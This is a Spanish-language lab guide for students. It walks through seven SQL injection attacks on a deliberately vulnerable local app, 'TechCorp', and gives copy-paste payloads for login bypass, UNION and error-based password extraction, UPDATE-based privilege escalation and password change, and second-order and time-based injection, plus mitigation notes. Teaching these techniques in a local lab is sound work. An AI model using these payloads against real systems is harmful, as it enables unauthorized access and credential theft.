# 📘 GUÍA PASO A PASO - Sistema TechCorp

## 🚀 PASO 0: Preparar la Aplicación

### 1. Instalar y Ejecutar

Abre tu terminal (CMD en Windows o Terminal en Mac/Linux) y escribe:

```powershell
# Windows
python -m pip install -r requirements.txt
python init_db.py
python app.py

# Mac/Linux
pip install -r requirements.txt
python init_db.py
python app.py
```

**¿Qué debes ver?**
```
* Running on http://127.0.0.1:5000
* Running on http://localhost:5000
```

### 2. Abrir la Aplicación

1. Abre tu navegador (Chrome, Firefox, Edge)
2. Escribe en la barra de direcciones: `http://localhost:5000`
3. Presiona Enter

**¿Qué debes ver?**
- Una página con el logo "🏢 TechCorp"
- Un dashboard con 6 tarjetas (Login, Directorio, Perfil, etc.)
- Estadísticas: "247 Empleados Activos", "42 Departamentos"
- Un botón rojo flotante abajo a la derecha que dice "🐛 Modo Debug"

---

## 🔴 ACTIVAR MODO DEBUG (IMPORTANTE)

**ANTES de empezar a probar vulnerabilidades, debes activar el modo debug para ver las queries SQL.**

### Cómo Activar:

1. Busca el botón rojo flotante en la **esquina inferior derecha** de la pantalla
2. Dice "🐛 Modo Debug"
3. Haz **clic** en ese botón
4. Verás una alerta que dice: "Modo Debug Activado - Ahora verás las queries SQL ejecutadas"
5. Haz clic en "OK"
6. **El botón cambiará a verde** y dirá "✅ Debug ON"

**✅ Ahora estás listo para ver las queries SQL en todas las páginas**

---

# 📋 VULNERABILIDAD 1: BYPASS DE LOGIN

## ¿Qué vamos a hacer?
Vamos a iniciar sesión como "admin" **SIN saber su contraseña**.

## Pasos Detallados:

### 1. Ir a la Página de Login

**En la página principal:**
- Busca la tarjeta que dice "🔐 Inicio de Sesión"
- Haz clic en esa tarjeta
- **O haz clic en "Acceder"** en el menú de arriba

**¿Qué debes ver?**
- Una pantalla morada con un formulario de login
- Logo "🏢 TechCorp"
- Dos campos: "Usuario" y "Contraseña"
- Botón azul que dice "Iniciar Sesión"

### 2. Ingresar el Payload Malicioso

**En el campo "Usuario"** escribe EXACTAMENTE (copia y pega):
```
admin'--
```

**En el campo "Contraseña"** escribe cualquier cosa, por ejemplo:
```
asdfgh
```

### 3. Hacer clic en "Iniciar Sesión"

**¿Qué debes ver EN PANTALLA?**

#### A) Sin Modo Debug (si no lo activaste):
- Mensaje verde: "✓ Inicio de sesión exitoso"
- Una tarjeta con:
  - Avatar morado con la letra "A"
  - Nombre: "admin"
  - Rol: "ADMIN"
- Detalles:
  - ID: 1
  - Email: admin@example.com
  - Rol: admin

#### B) Con Modo Debug (lo importante):
- Todo lo anterior MÁS...
- **Un cuadro negro en la parte inferior** que dice:
  ```
  🐛 Debug Info:

  Query SQL:
  SELECT * FROM users WHERE username = 'admin'--' AND password = 'asdfgh'

  Password (DB): admin123
  ```

## 🎯 ¿Qué Pasó?

1. La aplicación creó esta query SQL:
   ```sql
   SELECT * FROM users WHERE username = 'admin'--' AND password = 'asdfgh'
   ```

2. Las comillas simples (`'`) cerraron el campo username
3. Los dos guiones (`--`) **comentaron** el resto de la query
4. La verificación de contraseña **nunca se ejecutó**
5. ¡Iniciaste sesión sin saber la contraseña!

## 📸 Captura de Pantalla para tu Proyecto:

**Toma 3 screenshots:**
1. El formulario con el payload (`admin'--`)
2. El resultado exitoso (perfil del admin)
3. El cuadro debug negro mostrando la query SQL

---

# 📋 VULNERABILIDAD 2: EXTRAER CONTRASEÑAS (UNION)

## ¿Qué vamos a hacer?
Vamos a buscar empleados y hacer que la aplicación nos muestre **todas las contraseñas**.

## Pasos Detallados:

### 1. Ir al Directorio de Empleados

**Desde la página principal:**
- Busca la tarjeta "🔍 Directorio de Empleados"
- Haz clic en esa tarjeta

**¿Qué debes ver?**
- Título: "📋 Directorio de Empleados"
- Dos pestañas: "Buscar por ID" (activa) y "Buscar por Nombre"
- Un campo que dice "ID del Empleado"
- Botón "🔍 Buscar"

### 2. Probar una Búsqueda Normal Primero

**En el campo "ID del Empleado"** escribe:
```
1
```

**Haz clic en "🔍 Buscar"**

**¿Qué debes ver?**
- Una tarjeta con:
  - Avatar morado con "A"
  - Nombre: admin
  - Rol: ADMIN
  - ID: #1
  - Email: admin@example.com
  - Rol: admin

**Si el modo debug está activo**, verás abajo:
```
🐛 Debug Info:

Query SQL:
SELECT id, username, email, role FROM users WHERE id = 1

Tipo de búsqueda: id
```

### 3. Ahora Inyectar el UNION

**Borra el "1"** del campo "ID del Empleado"

**Escribe EXACTAMENTE** (copia y pega):
```
1 UNION SELECT id,username,password,email FROM users--
```

**Haz clic en "🔍 Buscar"**

**¿Qué debes ver EN PANTALLA?**

#### Resultado Principal:
- Varias tarjetas de empleados
- **FÍJATE EN LA COLUMNA "Rol"** - ¡Aquí aparecen las CONTRASEÑAS!

**Ejemplo de lo que verás:**

**Tarjeta 1:**
- Avatar: A
- Nombre: admin
- Rol: **admin123** ← ¡Esta es la contraseña!
- Email: admin@example.com

**Tarjeta 2:**
- Avatar: U
- Nombre: user1
- Rol: **pass123** ← ¡Contraseña de user1!
- Email: user1@example.com

**Tarjeta 3:**
- Avatar: U
- Nombre: user2
- Rol: **mypassword** ← ¡Contraseña de user2!
- Email: user2@example.com

#### Panel Debug (abajo, cuadro negro):
```
🐛 Debug Info:

Query SQL:
SELECT id, username, email, role FROM users WHERE id = 1
UNION
SELECT id,username,password,email FROM users--

Tipo de búsqueda: id
```

## 🎯 ¿Qué Pasó?

1. La query original era: `SELECT id, username, email, role FROM users WHERE id = 1`
2. Agregamos `UNION SELECT id,username,password,email FROM users--`
3. UNION **combina** los resultados de dos queries
4. La segunda query obtiene: id, username, **password**, email
5. Como la aplicación espera 4 columnas (id, username, email, role), pusimos **password** en el lugar de **role**
6. ¡La aplicación muestra las contraseñas pensando que son roles!

## 📸 Captura de Pantalla para tu Proyecto:

1. El formulario con el payload UNION
2. Las tarjetas mostrando contraseñas en lugar de roles
3. El panel debug mostrando la query completa

---

# 📋 VULNERABILIDAD 3: EXTRAER DATOS POR ERROR

## ¿Qué vamos a hacer?
Vamos a hacer que los **mensajes de error** nos revelen contraseñas.

## Pasos Detallados:

### 1. En la Misma Página (Directorio de Empleados)

**Haz clic en la pestaña "Buscar por Nombre"**

**¿Qué debes ver?**
- La pestaña cambió
- Ahora hay un campo que dice "Nombre del Empleado"
- Mismo botón "🔍 Buscar"

### 2. Probar una Búsqueda Normal

**En el campo "Nombre del Empleado"** escribe:
```
admin
```

**Haz clic en "🔍 Buscar"**

**¿Qué debes ver?**
- Una tarjeta con el usuario admin
- Todo normal

### 3. Inyectar el Payload de Error

**Borra "admin"** del campo

**Escribe EXACTAMENTE** (copia y pega):
```
admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INT)--
```

**Haz clic en "🔍 Buscar"**

**¿Qué debes ver EN PANTALLA?**

#### Cuadro Rojo de Error:
```
⚠️ Error en la búsqueda:

cannot cast to INTEGER: admin123
```

**¡BOOM! La contraseña está en el mensaje de error: `admin123`**

#### Panel Debug (abajo):
```
🐛 Debug Info:

Query SQL:
SELECT id, username, email, role FROM users
WHERE username LIKE '%admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INT)--%'

Tipo de búsqueda: name
```

## 🎯 ¿Qué Pasó?

1. Intentamos convertir (CAST) una contraseña (texto) a número entero (INT)
2. La base de datos **no puede** convertir "admin123" a número
3. SQLite muestra un error que **incluye el valor** que intentó convertir
4. El error revela: `cannot cast to INTEGER: admin123`
5. ¡Obtenemos la contraseña a través del mensaje de error!

### 4. Probar con Otro Usuario

**Cambia el payload a:**
```
x' AND 1=CAST((SELECT password FROM users WHERE username='user1') AS INT)--
```

**¿Qué verás?**
```
cannot cast to INTEGER: pass123
```

¡Contraseña de user1 revelada!

## 📸 Captura de Pantalla:

1. Formulario con el payload error-based
2. El cuadro rojo con el error mostrando la contraseña
3. El panel debug con la query

---

# 📋 VULNERABILIDAD 4: ESCALAR PRIVILEGIOS

## ¿Qué vamos a hacer?
Vamos a convertir un usuario normal en **administrador** modificando su rol en la base de datos.

## Pasos Detallados:

### 1. Ir a Mi Perfil

**Desde la página principal:**
- Busca la tarjeta "👤 Mi Perfil"
- Haz clic en esa tarjeta

**¿Qué debes ver?**
- Título: "👤 Mi Perfil"
- Dos campos:
  - "ID de Usuario"
  - "Biografía" (un cuadro de texto grande)
- Botón "💾 Actualizar Perfil"

### 2. Actualización Normal Primero

**En "ID de Usuario"** escribe:
```
2
```

**En "Biografía"** escribe:
```
Soy desarrollador senior
```

**Haz clic en "💾 Actualizar Perfil"**

**¿Qué debes ver?**
- Mensaje verde: "✓ Perfil actualizado exitosamente"
- Un cuadro gris con información actualizada:
  - ID: #2
  - Usuario: user1
  - Email: user1@example.com
  - **Rol: user** ← Usuario normal
  - Biografía: Soy desarrollador senior

### 3. Ahora Escalar a Admin

**Recarga la página** (F5) para limpiar el formulario

**En "ID de Usuario"** escribe:
```
2
```

**En "Biografía"** escribe EXACTAMENTE:
```
pwned', role='admin
```

**Haz clic en "💾 Actualizar Perfil"**

**¿Qué debes ver EN PANTALLA?**

#### Cuadro de Información (gris):
```
Información Actualizada

ID:         #2
Usuario:    user1
Email:      user1@example.com
Rol:        ADMIN  ← ¡¡¡CAMBIÓ DE "user" A "admin"!!!
Biografía:  pwned
```

#### Panel Debug (abajo, cuadro negro):
```
🐛 Debug Info:

Query SQL:
UPDATE users SET bio = 'pwned', role='admin' WHERE id = 2

Password (DB): pass123
```

## 🎯 ¿Qué Pasó?

1. La query original era: `UPDATE users SET bio = 'TEXTO_AQUÍ' WHERE id = 2`
2. Escribimos: `pwned', role='admin`
3. Las comillas (`'`) cerraron el campo bio
4. Agregamos una coma (`,`) para añadir otro campo
5. La query final fue: `UPDATE users SET bio = 'pwned', role='admin' WHERE id = 2`
6. ¡Modificamos el rol sin tener permiso!

### 4. Verificar el Cambio en Login

**Ve a la página de Login** (haz clic en "Acceder" arriba)

**Intenta iniciar sesión con:**
- Usuario: `user1`
- Contraseña: `pass123`

**¿Qué verás?**
- El usuario user1 ahora tiene **Rol: ADMIN**
- ¡Escalaste privilegios exitosamente!

## 📸 Captura de Pantalla:

1. Formulario con el payload de escalación
2. El resultado mostrando Rol: ADMIN (antes era user)
3. Panel debug con la query UPDATE
4. (Opcional) Login exitoso mostrando el nuevo rol

---

# 📋 VULNERABILIDAD 5: CAMBIAR CONTRASEÑA DE OTROS

## ¿Qué vamos a hacer?
Vamos a cambiar la contraseña del admin desde la actualización de perfil.

## Pasos Detallados:

### 1. Estar en Mi Perfil

Si no estás ahí:
- Clic en el logo "🏢 TechCorp" (arriba izquierda) para ir al inicio
- Clic en "👤 Mi Perfil"

### 2. Modificar Contraseña del Admin

**En "ID de Usuario"** escribe:
```
1
```

**En "Biografía"** escribe EXACTAMENTE:
```
hacked', password='12345678', role='admin
```

**Haz clic en "💾 Actualizar Perfil"**

**¿Qué debes ver EN PANTALLA?**

#### Cuadro de Información:
```
Información Actualizada

ID:         #1
Usuario:    admin
Email:      admin@example.com
Rol:        admin
Biografía:  hacked
```

#### Panel Debug (importante):
```
🐛 Debug Info:

Query SQL:
UPDATE users SET bio = 'hacked', password='12345678', role='admin' WHERE id = 1

Password (DB): 12345678  ← ¡La contraseña cambió de admin123 a 12345678!
```

### 3. Verificar el Cambio

**Ve al Login:**
- Usuario: `admin`
- Contraseña: `admin123` ← La contraseña ANTERIOR

**¿Qué pasa?**
- ❌ "Usuario o contraseña incorrectos"

**Ahora intenta con la NUEVA contraseña:**
- Usuario: `admin`
- Contraseña: `12345678`

**¿Qué pasa?**
- ✅ ¡Login exitoso!

## 🎯 ¿Qué Pasó?

Modificamos múltiples campos en un solo UPDATE:
- bio = 'hacked'
- password = '12345678'
- role = 'admin'

¡Cambiamos la contraseña del administrador sin su permiso!

## 📸 Captura de Pantalla:

1. Formulario con el payload
2. Panel debug mostrando password='12345678'
3. Intento fallido con contraseña vieja
4. Login exitoso con contraseña nueva

---

# 📋 VULNERABILIDAD 6: REGISTRO MALICIOSO

## ¿Qué vamos a hacer?
Vamos a registrar un usuario con datos maliciosos que se ejecutarán después.

## Pasos Detallados:

### 1. Ir a Registro

**Desde la página principal:**
- Busca la tarjeta "📝 Nuevo Empleado"
- Haz clic en esa tarjeta
- **O haz clic en "Registrarse"** en el menú de arriba

**¿Qué debes ver?**
- Pantalla morada similar al login
- Título: "Registro de Nuevo Empleado"
- Dos campos:
  - "Nombre de Usuario"
  - "Correo Electrónico Corporativo"
- Botón "📝 Registrar Empleado"

### 2. Registro Normal Primero

**En "Nombre de Usuario"** escribe:
```
empleado5
```

**En "Correo Electrónico"** escribe:
```
emp5@techcorp.com
```

**Haz clic en "📝 Registrar Empleado"**

**¿Qué debes ver?**
- Mensaje verde: "✓ Empleado registrado exitosamente"
- Cuadro con datos del empleado:
  - ID: (nuevo número)
  - Usuario: empleado5
  - Email: emp5@techcorp.com
  - Rol: user
  - Contraseña: default123

### 3. Registro con Payload Malicioso

**Recarga la página** (F5)

**En "Nombre de Usuario"** escribe EXACTAMENTE:
```
admin'--
```

**En "Correo Electrónico"** escribe:
```
hacker@test.com
```

**Haz clic en "📝 Registrar Empleado"**

**¿Qué debes ver EN PANTALLA?**

#### Cuadro de Datos (gris):
```
Datos del Empleado Registrado

ID:          (nuevo ID, por ejemplo 6)
Usuario:     admin
Email:       admin@example.com
Rol:         admin
Contraseña:  admin123
```

#### Panel Debug (cuadro negro):
```
🐛 Debug Info:

INSERT Query:
INSERT INTO users (username, email, password, role)
VALUES ('admin'--', 'hacker@test.com', 'default123', 'user')

SELECT Query:
SELECT * FROM users WHERE username = 'admin'--'
```

## 🎯 ¿Qué Pasó?

1. Intentamos insertar usuario `admin'--`
2. En el SELECT posterior: `SELECT * FROM users WHERE username = 'admin'--'`
3. Las comillas y el comentario cortaron la query
4. La query se convirtió en: `SELECT * FROM users WHERE username = 'admin'`
5. ¡El SELECT devolvió el usuario **admin original**, no el que registramos!
6. Esta es una "Second-Order" injection - el payload se ejecuta en una query diferente

## 📸 Captura de Pantalla:

1. Formulario con `admin'--`
2. Resultado mostrando datos del admin original (no el nuevo usuario)
3. Panel debug mostrando ambas queries (INSERT y SELECT)

---

# 📋 VULNERABILIDAD 7: BÚSQUEDA DE PRODUCTOS

## ¿Qué vamos a hacer?
Vamos a hacer que la aplicación tarde más tiempo en responder para confirmar la inyección SQL.

## Pasos Detallados:

### 1. Ir a Productos

**Desde la página principal:**
- Busca la tarjeta "📦 Catálogo de Productos"
- Haz clic en esa tarjeta

**¿Qué debes ver?**
- Título: "📦 Catálogo de Productos"
- Un selector (dropdown) con categorías:
  - Selecciona una categoría
  - Electrónica
  - Muebles
  - Software
  - Servicios
- Un campo de texto debajo
- Botón "🔍 Buscar Productos"

### 2. Búsqueda Normal

**En el selector**, elige "Electrónica"

**O en el campo de texto** escribe:
```
electronics
```

**Haz clic en "🔍 Buscar Productos"**

**¿Qué debes ver?**
- Tarjetas con productos:
  - 💻 Laptop Pro (ELECTRONICS) - $1200.00
  - 💻 Mouse Wireless (ELECTRONICS) - $25.00

### 3. Time-based Injection

**En el campo de texto** (ignora el selector), escribe EXACTAMENTE:
```
electronics' AND (SELECT COUNT(*) FROM users AS T1, users AS T2, users AS T3)>0--
```

**Haz clic en "🔍 Buscar Productos"**

**¿Qué debes ver?**
- La página **tarda varios segundos** en responder (2-5 segundos)
- Finalmente muestra los mismos productos de electronics

#### Panel Debug:
```
🐛 Debug Info:

Query SQL:
SELECT * FROM products
WHERE category = 'electronics' AND (SELECT COUNT(*) FROM users AS T1, users AS T2, users AS T3)>0--'
```

## 🎯 ¿Qué Pasó?

1. La query hace un `COUNT(*)` con 3 JOIN de la tabla users consigo misma
2. Si hay 4 usuarios, esto genera: 4 × 4 × 4 = 64 operaciones
3. Esto causa un **retraso** en la respuesta
4. Midiendo el tiempo, un atacante puede **inferir información**
5. Por ejemplo: "¿La contraseña del admin tiene más de 10 caracteres?"
   - Si tarda → SÍ
   - Si no tarda → NO

## 📸 Captura de Pantalla:

1. Formulario con el payload time-based
2. Cronómetro o nota del tiempo que tardó
3. Panel debug con la query completa

---

# 🎯 RESUMEN DE LO QUE APRENDISTE

## Vulnerabilidades Probadas:

1. ✅ **Boolean-based Blind** - Login sin contraseña
2. ✅ **UNION-based** - Extraer contraseñas de todos los usuarios
3. ✅ **Error-based** - Obtener datos a través de errores
4. ✅ **UPDATE Injection** - Escalar privilegios a admin
5. ✅ **UPDATE Injection** - Cambiar contraseñas de otros usuarios
6. ✅ **Second-Order** - Payload ejecutado en query diferente
7. ✅ **Time-based Blind** - Inferir datos por tiempo de respuesta

## 📸 Checklist de Screenshots para tu Proyecto:

Para CADA vulnerabilidad necesitas:
- [ ] Screenshot del formulario con el payload
- [ ] Screenshot del resultado (éxito o error)
- [ ] Screenshot del panel debug mostrando la query SQL
- [ ] (Opcional) Screenshot del impacto (datos robados, cambios realizados)

## 💡 Tips para el Proyecto Académico:

### Estructura Sugerida:

```
1. INTRODUCCIÓN
   - Presentar TechCorp como sistema empresarial
   - Explicar que parece legítimo pero tiene vulnerabilidades

2. METODOLOGÍA
   - Herramientas: Navegador + Modo Debug
   - Enfoque: Pruebas manuales en entorno local

3. VULNERABILIDADES ENCONTRADAS

   Para cada una:

   3.1 BYPASS DE AUTENTICACIÓN
       - Descripción
       - Payload usado: admin'--
       - Screenshot del formulario
       - Screenshot del éxito
       - Screenshot del debug (query SQL)
       - Impacto: Acceso sin credenciales

   3.2 EXTRACCIÓN DE CONTRASEÑAS (UNION)
       - Descripción
       - Payload usado: 1 UNION SELECT...
       - Screenshots
       - Impacto: Robo de credenciales

   [... y así con cada vulnerabilidad]

4. ANÁLISIS DE IMPACTO
   - Acceso no autorizado
   - Robo de información sensible
   - Escalación de privilegios
   - Modificación de datos

5. MITIGACIÓN
   - Comparar con app_segura.py
   - Prepared Statements
   - Validación de entrada
   - Principio de menor privilegio

6. CONCLUSIONES
   - Peligro de SQL Injection
   - Importancia de seguridad en desarrollo
   - Aprendizajes obtenidos
```

## 🔄 Resetear la Base de Datos

Si modificaste muchos datos y quieres empezar de nuevo:

```bash
python init_db.py
```

Esto recreará la base de datos con los datos originales.

## 📞 ¿Problemas?

### No veo el panel debug:
- ¿Hiciste clic en "🐛 Modo Debug"?
- ¿El botón está verde y dice "✅ Debug ON"?
- Recarga la página (F5) después de activarlo

### No funcionan los payloads:
- ¿Copiaste y pegaste EXACTAMENTE como está escrito?
- Las comillas son importantes: `'` no `"`
- Los espacios también importan

### Error "database locked":
- Cierra la aplicación (Ctrl+C en terminal)
- Vuelve a ejecutar: `python app.py`

## 🎓 Usuarios de Prueba

Puedes usar estas credenciales para login normal:

```
admin:admin123
user1:pass123
user2:mypassword
testuser:test456
```

## ⚠️ IMPORTANTE

Esta aplicación es para **aprendizaje únicamente**.

- ✅ Úsala para tu proyecto académico
- ✅ Aprende cómo funcionan las vulnerabilidades
- ✅ Compara con código seguro
- ❌ NUNCA uses esto en sistemas reales
- ❌ NUNCA expongas esta app a internet
- ❌ Realizar ataques sin autorización es ILEGAL

---

**¿Todo claro? Ahora tienes instrucciones paso a paso para probar cada vulnerabilidad.**

**Empieza con el PASO 0 y sigue en orden. ¡Éxito con tu proyecto!**
